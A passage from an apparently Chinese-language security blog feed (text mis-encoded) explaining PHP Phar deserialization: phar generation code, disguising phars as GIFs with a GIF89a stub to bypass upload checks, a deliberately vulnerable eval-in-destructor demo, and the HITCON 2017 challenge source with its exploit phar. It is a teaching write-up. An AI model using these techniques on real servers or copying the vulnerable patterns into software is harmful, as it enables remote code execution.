<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">$o-&gt;data = <span class="string">&#x27;ca01h&#x27;</span>;</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>è®¿é—®å,ä¼šç”Ÿæˆä¸€ä¸ªphar.pharåœ¨å½“å‰ç›®å½•ä¸‹ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200512093829.png" alt=""></p>
<p>å¯ä»¥æ˜æ˜¾çš„çœ‹åˆ°meta-dataæ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨çš„ã€‚</p>
<p>æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œphpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼ŒçŸ¥é“åˆ›å®‡æµ‹è¯•åå—å½±å“çš„å‡½æ•°åˆ—è¡¨ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200512094000.png" alt=""></p>
<p>å°±ç”¨æ¯”è¾ƒå¸¸ç”¨çš„å‡½æ•°<code>file_get_contents()</code>å‡½æ•°ä¸¾ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; data;   <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_get_contents(<span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200512112709.png" alt=""></p>
<p>è‡³äºä¸ºä»€ä¹ˆè¿™äº›å‡½æ•°åœ¨è§£æpharæ–‡ä»¶æ—¶ä¼šè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œå¯ä»¥çœ‹ä¸€ä¸‹zsfå¸ˆå‚…çš„æ·±å±‚æ¬¡å‰–æï¼š</p>
<p><a href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>
<p>åœ¨è·Ÿè¸ªäº†å—å½±å“å‡½æ•°çš„è°ƒç”¨æƒ…å†µåå‘ç°ï¼Œé™¤äº†æ‰€æœ‰æ–‡ä»¶å‡½æ•°ï¼Œåªè¦æ˜¯å‡½æ•°çš„å®ç°è¿‡ç¨‹ç›´æ¥æˆ–é—´æ¥è°ƒç”¨äº†<code>php_stream_open_wrapper</code>ï¼Œéƒ½å¯èƒ½è§¦å‘pharååºåˆ—åŒ–æ¼æ´ã€‚</p>
<h3 id="å°†Pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶">å°†Pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶</h3>
<p>åœ¨å‰é¢åˆ†æpharçš„æ–‡ä»¶ç»“æ„æ—¶å¯èƒ½ä¼šæ³¨æ„åˆ°ï¼Œphpè¯†åˆ«pharæ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„stubï¼Œæ›´ç¡®åˆ‡ä¸€ç‚¹æ¥è¯´æ˜¯<code>__HALT_COMPILER();?&gt;</code>è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;img.phar&#x27;</span>);</span><br><span class="line">    $phar -&gt; startBuffering();</span><br><span class="line">    $phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line">    $phar -&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);  <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    $object = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $object -&gt; data = <span class="string">&#x27;ca01h&#x27;</span>;</span><br><span class="line">    $phar -&gt; setMetadata($object);  <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200512113427.png" alt=""></p>
<p>é‡‡ç”¨è¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡å¾ˆå¤§ä¸€éƒ¨åˆ†ä¸Šä¼ æ£€æµ‹ã€‚</p>
<h2 id="Pharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨">Pharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</h2>
<h3 id="æ¼æ´åˆ©ç”¨æ¡ä»¶">æ¼æ´åˆ©ç”¨æ¡ä»¶</h3>
<ol>
<li>pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚</li>
<li>è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚</li>
<li>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”<code>:</code>ã€<code>/</code>ã€<code>phar</code>ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚</li>
</ol>
<h3 id="Pharç®€å•åˆ©ç”¨">Pharç®€å•åˆ©ç”¨</h3>
<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>upload file<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Upload&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>upload.php</p>
<p>ä»…å…è®¸æ ¼å¼ä¸ºgifçš„æ–‡ä»¶ä¸Šä¼ ã€‚ä¸Šä¼ æˆåŠŸçš„æ–‡ä»¶ä¼šå­˜å‚¨åˆ°upload_fileç›®å½•ä¸‹ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>evil.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $data = <span class="string">&#x27;echo &quot;Hello World&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&quot;file&quot;</span>])&#123;</span><br><span class="line">	file_exists($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»•è¿‡æ€è·¯ï¼šGIFæ ¼å¼éªŒè¯å¯ä»¥é€šè¿‡åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ GIF89aç»•è¿‡ã€‚</p>
<p>ç”¨ä¸‹é¢çš„ä»£ç ç”Ÿæˆpharæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">$o-&gt;data = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>ç”Ÿæˆçš„<code>phar.phar</code>ä¿®æ”¹åç¼€å<code>phar.gif</code>ï¼Œå†ä¸Šä¼ è¯¥æ–‡ä»¶ï¼Œç”¨pharåè®®è§£æï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200513193604.png" alt=""></p>
<h2 id="Pharååºåˆ—åŒ–å®ä¾‹">Pharååºåˆ—åŒ–å®ä¾‹</h2>
<h3 id="HITCON-2017-Baby-h-Master-PHP">[HITCON 2017]Baby^h Master PHP</h3>
<p>æˆ‘ä»¬å…ˆçœ‹çœ‹Orange åœ¨ 2017 å¹´ hitcon ä¸Šé¢å‡ºçš„åˆ©ç”¨ Phar è¿›è¡Œååºåˆ—åŒ–ï¼Œæ¯•ç«Ÿè¿™æ˜¯ç¬¬ä¸€æ¬¡å‡ºç°è¿™ç§åˆ©ç”¨æ–¹å¼çš„åœ°æ–¹ï¼Œåº”è¯¥æ¥è¯´æ˜¯æœ€ç»å…¸çš„åˆ©ç”¨åœºæ™¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// å¾—åˆ° flag çš„åŒ¿åå‡½æ•°</span></span><br><span class="line">    $FLAG = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/read_flag`);&#x27;</span>);                    </span><br><span class="line">    $SECRET  = `/read_secret`;</span><br><span class="line">	<span class="comment">// æ ¹æ® remote_addr ç»™æ¯ä¸ªäººåˆ›å»ºä¸€ä¸ªæ²™ç›’</span></span><br><span class="line">    $SANDBOX = <span class="string">&quot;/var/www/data/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);   </span><br><span class="line">    @mkdir($SANDBOX);</span><br><span class="line">    @chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">&quot;session-data&quot;</span>])) &#123;                </span><br><span class="line">        $data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">        $hmac = hash_hmac(<span class="string">&quot;sha1&quot;</span>, $data, $SECRET);</span><br><span class="line">        <span class="comment">//å°†æ¯ä¸ªäººå”¯ä¸€çš„æ²™ç›’å¯¹è±¡åŠ ä¸Šç­¾ååä½œä¸º session-data</span></span><br><span class="line">        setcookie(<span class="string">&quot;session-data&quot;</span>, sprintf(<span class="string">&quot;%s-----%s&quot;</span>, $data, $hmac));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $avatar;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//è®¾ç½®äº†å¤´åƒçš„è·¯å¾„ä¸ºæ²™ç›’è·¯å¾„</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;avatar = $path;                                          </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            $random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;function my_function_<span class="subst">$random</span>() &#123;&quot;</span></span><br><span class="line">                .<span class="string">&quot;  global \$FLAG; \$FLAG();&quot;</span>                                </span><br><span class="line">                 <span class="comment">/*ååºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡å°±èƒ½åˆ›å»ºä¸€ä¸ªéšæœºåå­—çš„å‡½æ•°ï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°å°±èƒ½è°ƒç”¨ flagï¼Œå®é™…ä¸Šè¿™æ˜¯ä¸€ä¸ªéª—å±€ï¼ŒåŒ¿åå‡½æ•°ä¹Ÿæ˜¯æœ‰åå­—çš„*/</span></span><br><span class="line">                .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            $_GET[<span class="string">&quot;lucky&quot;</span>]();</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­èº«ä»½ï¼Œå¦‚æœèº«ä»½æ­£ç¡®è¿”å›å¤´åƒè·¯å¾„(æ²™ç›’è·¯å¾„)</span></span><br><span class="line"><span class="comment">//è¯¥å‡½æ•°ä¸å¯ç»•è¿‡</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $SECRET;</span><br><span class="line">        $data = $_COOKIE[<span class="string">&quot;session-data&quot;</span>];</span><br><span class="line">        <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">&quot;-----&quot;</span>, $data, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">&quot;sha1&quot;</span>, $data, $SECRET), $hmac) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye&quot;</span>);</span><br><span class="line">        $data = unserialize($data);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> $data-&gt;avatar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–å¤´åƒï¼Œæ£€æŸ¥å¤´æ˜¯å¦ä¸ºGIF89a ï¼Œæ­£ç¡®åå­˜å…¥æ²™ç›’</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$path</span>) </span>&#123;</span><br><span class="line">        $data = file_get_contents($_GET[<span class="string">&quot;url&quot;</span>] . <span class="string">&quot;/avatar.gif&quot;</span>);            </span><br><span class="line">        <span class="comment">//è¿™ä¸ªå°±æ˜¯åˆ©ç”¨ phar:// è¿›è¡Œååºåˆ—åŒ–çš„ç‚¹</span></span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">&quot;GIF89a&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Fuck off&quot;</span>);</span><br><span class="line">        file_put_contents($path . <span class="string">&quot;/avatar.gif&quot;</span>, $data);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Upload OK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–è¿™ä¸ªæ²™ç›’ä¸­çš„å¤´åƒ</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">$path</span>) </span>&#123;                                                 </span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($path . <span class="string">&quot;/avatar.gif&quot;</span>) )</span><br><span class="line">            $path = <span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">        header(<span class="string">&quot;Content-Type: image/gif&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>(file_get_contents($path . <span class="string">&quot;/avatar.gif&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="string">&quot;m&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> ($mode == <span class="string">&quot;upload&quot;</span>)</span><br><span class="line">    upload(check_session());</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">&quot;show&quot;</span>)</span><br><span class="line">    show(check_session());</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>è¿™é“é¢˜å¾ˆæ˜ç¡®å°±æ˜¯ä¸€ä¸ªååºåˆ—åŒ–çš„é¢˜ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯é€šè¿‡ååºåˆ—åŒ– Admin è¿™ä¸ªç±»å¾—åˆ°æˆ‘ä»¬çš„ flagã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³åˆ©ç”¨ unserailize() ï¼Œé€šè¿‡æ§åˆ¶å…¶å‚æ•°å»å®ç°æˆ‘ä»¬çš„ååºåˆ—åŒ–ï¼Œæˆ‘ä»¬å°±å¿…é¡»ç»•è¿‡å¯¹ cookie çš„æ£€æµ‹ï¼Œä½†æ˜¯cookie æ˜¯é€šè¿‡ remote_addr é…åˆ sha1 è¿›è¡Œ hmac ç­¾åç”Ÿæˆçš„ï¼Œæƒ³ç»•è¿‡ä»–é‚£æ˜¯ä¸å¯èƒ½çš„ã€‚ç°åœ¨æˆ‘ä»¬å°±è¦æ€è€ƒä¸€ä¸‹ æ˜¯ä¸æ˜¯èƒ½ç”¨ Phar è¿™ä¸ªåœ¨ä¸ä½¿ç”¨ unserialize() çš„æ–¹å¼å®Œæˆåºåˆ—åŒ–æˆåŠŸ get flagï¼Œç„¶åæˆ‘ä»¬å°±çœ‹åˆ°äº†è¿™ä¸ªå‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$path</span>) </span>&#123;</span><br><span class="line">    $data = file_get_contents($_GET[<span class="string">&quot;url&quot;</span>] . <span class="string">&quot;/avatar.gif&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">&quot;GIF89a&quot;</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Fuck off&quot;</span>);</span><br><span class="line">    file_put_contents($path . <span class="string">&quot;/avatar.gif&quot;</span>, $data);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Upload OK&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬åªè¦çš„ç²¾å¿ƒæ„é€ ä¸€ä¸ªåŒ…å« Admin å¯¹è±¡ã€åŒ…å« avatar.gif æ–‡ä»¶ï¼Œå¹¶ä¸” stub æ˜¯ <code>GIF89a</code> çš„ phar æ–‡ä»¶ç„¶åä¸Šä¼ ä¸Šå»ï¼Œä¸‹ä¸€æ¬¡è¯·æ±‚é€šè¿‡ Phar:// åè®®è®© file_get_contents è¯·æ±‚è¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥å®ç°æˆ‘ä»¬å¯¹ Admin å¯¹è±¡çš„ååºåˆ—åŒ–äº†ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $avatar = <span class="string">&#x27;orz&#x27;</span>;  </span><br><span class="line">&#125; </span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">$p[<span class="string">&#x27;file.php&#x27;</span>] = <span class="string">&#x27;&lt;?php ?&gt;&#x27;</span>;</span><br><span class="line">$p-&gt;setMetadata(<span class="keyword">new</span> Admin());</span><br><span class="line">$p-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line">rename(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.phar&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.gif&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¹‹åä¼šåˆ©ç”¨åŒ¿åå‡½æ•°ç”Ÿæˆå‡½æ•°åçš„ç‰¹ç‚¹ï¼Œè¿™é‡Œå°±ä¸å¤šå™è¿°ã€‚</p>
<p>è¿™é“é¢˜æˆ‘åœ¨BUUä¸Šé¢ä¸€ç›´æ²¡æœ‰å¤ç°æˆåŠŸï¼Œå¡åœ¨ä¸Šä¼ pharæ–‡ä»¶ï¼Œä¸€ç›´å›æ˜¾<code>fuck off</code>ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæœ‰çŸ¥é“çš„å¸ˆå‚…å¯ä»¥èµæ•™ä¸€ä¸‹ã€‚</p>
<h3 id="LCTF2018-T4lk-1sch34p-sh0w-m3-the-sh31l">[LCTF2018] T4lk 1sch34p,sh0w m3 the sh31l</h3>
<p>è¿™é“é¢˜æ²¡æœ‰å¤ç°ç¯å¢ƒï¼Œæ˜¯K0rz3nå¸ˆå‚…æ ¹æ®ä¸Šé¢è¿™é“é¢˜é­”æ”¹çš„ã€‚</p>
<p>å‡ºé¢˜äººçš„æ€è·¯ï¼š</p>
<blockquote>
<p><a href="https://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/">https://www.k0rz3n.com/2018/11/19/LCTF 2018 T4lk 1s ch34p,sh0w m3 the sh31l è¯¦ç»†åˆ†æ/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>PHPååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPååºåˆ—åŒ–å­¦ä¹ -sessionååºåˆ—åŒ–</title>
    <url>/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="PHPååºåˆ—åŒ–æ¼æ´å­¦ä¹ â€”â€”Sessionååºåˆ—åŒ–">PHPååºåˆ—åŒ–æ¼æ´å­¦ä¹ â€”â€”Sessionååºåˆ—åŒ–</h1>
<h2 id="0x01-PHPçš„Sessionæœºåˆ¶">0x01 PHPçš„Sessionæœºåˆ¶</h2>
<p>åœ¨å­¦ä¹  <strong>session</strong> ååºåˆ—åŒ–ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£è¿™å‡ ä¸ªå‚æ•°çš„å«ä¹‰ã€‚</p>
<table>
<thead>
<tr>
<th>Directive</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
